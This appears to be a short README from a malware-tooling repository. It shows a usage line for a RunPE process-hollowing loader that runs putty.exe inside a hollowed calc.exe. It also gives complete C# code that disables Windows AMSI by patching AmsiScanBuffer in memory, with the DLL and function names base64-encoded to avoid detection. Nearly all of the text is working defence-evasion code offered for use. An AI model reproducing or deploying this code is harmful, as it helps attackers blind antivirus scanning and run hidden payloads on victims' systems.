# RunPE (x86/32-bit only)

Usage: 
```c#
RunPE.Run("C:\\windows\\syswow64\\calc.exe", File.ReadAllBytes("putty.exe"));
```

For a 64-bit version see: https://github.com/gigajew/Mandark

# AMSI Disable patch (by Rasta Mouse)
```c#
private static string Decode(string data)
{
	return Encoding.UTF8.GetString(Convert.FromBase64String(data));
}
public static void DisableAMSI()
{
	// credits: Rasta Mouse
	uint flOld;
	IntPtr amsilib = LoadLibrary(Decode("YW1zaS5kbGw="));//"amsi.dll");
	IntPtr proc = GetProcAddress(amsilib, Decode("QW1zaVNjYW5CdWZmZXI="));//"AmsiScanBuffer");
	byte[] _64bit = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
	byte[] _32bit = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
	if (IntPtr.Size * 8 == 64)
	{
		ReplaceCode(proc, _64bit);
	}
	else
	{
		ReplaceCode(proc, _32bit);
	}
}

private static void ReplaceCode(IntPtr location, byte[] newData)
{
	uint flOld;
	VirtualProtect(location, (uint)newData.Length, 0x40, out flOld);
	Marshal.Copy(newData, 0, location, newData.Length);
	VirtualProtect(location, (uint)newData.Length, flOld, out flOld);
}
```